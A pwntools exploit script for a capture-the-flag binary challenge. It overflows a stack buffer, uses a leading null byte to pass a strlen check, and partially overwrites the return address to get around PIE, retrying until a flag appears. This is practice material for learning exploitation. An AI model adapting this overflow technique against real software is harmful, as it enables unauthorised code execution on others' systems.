# using a nullbyte in the string to bypass the check by strlen
# and bypassing pie using the same technique of the 7
from pwn import *

get_flag = True
chall_name = '8'

context.arch = "amd64"

def run_with_gdb(p):
    gdb.attach(p,'''
    set follow-fork-mode parent
    b *challenge+486''')

def run_exploit(p, debug, timing):
    if debug:
        run_with_gdb(p)
        p.interactive()
    
    payload_size = '154' # exact size to ignore the new line after the input
    overflow_until_ret = b'\x00' # null byte to bypass strlen

    #overflow_until_ret += cyclic(400, n=8)
    overflow_until_ret += b'A' * cyclic_find('ataaaaaa', n=8)
    ret_address = p16(0x54d4) # p16 because two bytes, p64 will just generate 0x00000s

    exploit = overflow_until_ret + ret_address

    print(p.recvrepeat(timing).decode())
    p.sendline(payload_size)
    print(p.recvrepeat(timing).decode())

    p.sendline(exploit)
    output = p.recvrepeat(timing).decode()

    print(output)

    if get_flag:
        if 'flag' in output:
            print("GOT FLAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAG")
            p.close()
        else:
            p.close()
            main()

    p.close()

def main():
    if get_flag:
        ssh_connection = ssh(host='',user='hacker')
        process_full_path = '/challenge/' + chall_name
        p = ssh_connection.run(process_full_path)
        
        run_exploit(p, False, 2)
        ssh_connection.close()
    else:
        process_full_path = './' + chall_name
        p = process(process_full_path)
        run_exploit(p, False, 0.2)

main()
